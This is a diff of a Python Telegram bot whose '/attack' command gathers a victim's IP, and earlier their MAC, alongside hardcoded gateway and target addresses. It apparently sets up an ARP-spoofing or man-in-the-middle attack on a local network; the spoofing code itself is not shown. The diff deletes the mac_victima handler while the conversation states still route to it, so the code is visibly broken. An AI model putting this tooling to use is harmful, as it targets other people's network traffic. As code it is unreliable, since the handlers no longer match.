@@ -36,19 +36,6 @@ def attack(update, context):
     )
 
     return IP
-  
-def mac_victima(update, context):
-
-    context.user_data['mac_victima'] = update.message.text
-
-    reply_keyboard = [['/cancel']]
-    update.message.reply_text(
-        '¿Cuál es la MAC de su víctima?',
-        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
-    )
-
-    return MAC
-
 
 def ipattack(update, context):
 
@@ -57,8 +44,8 @@ def ipattack(update, context):
     gateway_ip = "192.168.75.1"
     gateway_mac = "00:50:56:C0:00:08"
     
-    target_ip = context.user_data['ip']
-    target_mac = context.user_data['mac']
+    target_ip = update.message.text
+    target_mac = "00:0C:29:A0:F7:39"
     
     print(target_ip)
     print(target_mac)
@@ -99,7 +86,6 @@ def main():
         entry_points=[CommandHandler('attack', attack)],
         states={
             IP: [MessageHandler(None, mac_victima)],
-            MAC: [MessageHandler(None, ipattack)],
         },
         fallbacks=[CommandHandler('cancel', cancel)],
         allow_reentry=True
